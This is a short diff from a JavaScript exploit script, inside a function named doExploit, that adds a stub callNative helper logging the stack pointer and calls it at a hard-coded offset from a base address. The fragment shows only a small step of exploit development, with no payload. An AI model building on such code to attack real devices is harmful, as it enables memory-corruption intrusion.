@@ -299,8 +299,12 @@ function doExploit(buf, stale, temp) {
 		return sp;
 	}
 
-	log('Stack sitting at: ' + paddr(getSP()));
-	log('Stack sitting at: ' + paddr(getSP()));
+	function callNative(addr) {
+		var sp = getSP();
+		log('Setting up stack at SP ' + paddr(sp));
+	}
+
+	callNative(add2(mainaddr, 0x433744));
 }
 
 function doItAll() {
